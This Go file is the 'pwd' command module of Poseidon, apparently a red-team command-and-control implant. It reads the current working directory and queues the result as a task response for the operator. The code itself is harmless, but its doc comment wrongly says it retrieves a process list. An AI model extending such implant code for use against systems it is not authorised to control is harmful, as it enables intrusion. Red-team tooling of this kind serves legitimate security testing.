package pwd

import (
	"encoding/json"
	"os"
	"sync"

	"github.com/xorrior/poseidon/pkg/profiles"
	"github.com/xorrior/poseidon/pkg/utils/structs"
)

var mu sync.Mutex

//Run - interface method that retrieves a process list
func Run(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID

	dir, err := os.Getwd()

	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"

		resp, _ := json.Marshal(msg)
		mu.Lock()
		profiles.TaskResponses = append(profiles.TaskResponses, resp)
		mu.Unlock()
		return
	}
	msg.Completed = true
	msg.UserOutput = dir
	resp, _ := json.Marshal(msg)
	mu.Lock()
	profiles.TaskResponses = append(profiles.TaskResponses, resp)
	mu.Unlock()
	return
}
